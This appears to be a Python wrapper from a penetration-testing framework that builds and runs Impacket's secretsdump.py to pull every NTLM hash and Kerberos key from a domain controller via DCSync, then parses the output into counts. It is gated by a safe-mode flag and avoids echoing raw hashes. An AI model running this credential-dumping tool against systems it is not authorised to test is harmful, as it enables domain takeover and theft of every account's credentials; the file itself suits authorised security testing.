"""
Impacket secretsdump wrapper — DCSync + SAM/LSA hash extraction.

Once a domain admin (or DCSync-privileged) credential is obtained,
secretsdump pulls every credential hash from the DC. Output format is
the well-known ``user:rid:lmhash:nthash:::`` triplet plus Kerberos keys.

Risk class: ``destructive`` — DCSync is logged in DC security event ID
4662 and will trigger most EDRs. Gated by ``safe_mode`` in
``core/workflow.py``.
"""

from __future__ import annotations

import re
from typing import Any, Dict, List

from tools.base_tool import BaseTool


class ImpacketSecretsdumpTool(BaseTool):
    def __init__(self, config: Dict[str, Any]) -> None:
        super().__init__(config)
        # Most distributions ship the script as ``secretsdump.py``.
        self.tool_name = "secretsdump.py"

    def get_command(self, target: str, **kwargs: Any) -> List[str]:
        cfg = self.config.get("tools", {}).get("impacket", {})
        # ``target`` is a connection string: domain/user:password@dc-ip
        # (impacket convention). Operator constructs it.
        cmd: List[str] = ["secretsdump.py", target]

        if kwargs.get("just_dc", cfg.get("just_dc", True)):
            cmd.append("-just-dc")
        if kwargs.get("just_dc_ntlm", cfg.get("just_dc_ntlm", False)):
            cmd.append("-just-dc-ntlm")
        # ``-no-pass`` for kerberos ticket auth.
        if kwargs.get("no_pass", cfg.get("no_pass", False)):
            cmd.append("-no-pass")
        return cmd

    def parse_output(self, output: str) -> Dict[str, Any]:
        result: Dict[str, Any] = {
            "ntlm_hashes": 0,
            "kerberos_keys": 0,
            "machine_accounts": 0,
            "users": [],
        }
        for line in output.splitlines():
            # NTLM line: user:rid:lmhash:nthash:::
            m = re.match(r"^([^:]+):(\d+):([0-9a-f]{32}):([0-9a-f]{32}):::", line)
            if m:
                result["ntlm_hashes"] += 1
                user = m.group(1)
                if user.endswith("$"):
                    result["machine_accounts"] += 1
                else:
                    result["users"].append(user)
            elif ":aes256-cts-hmac-sha1-96:" in line or ":aes128-cts-hmac-sha1-96:" in line:
                result["kerberos_keys"] += 1
        # Don't echo raw hashes anywhere — finding consumers see counts only.
        return result
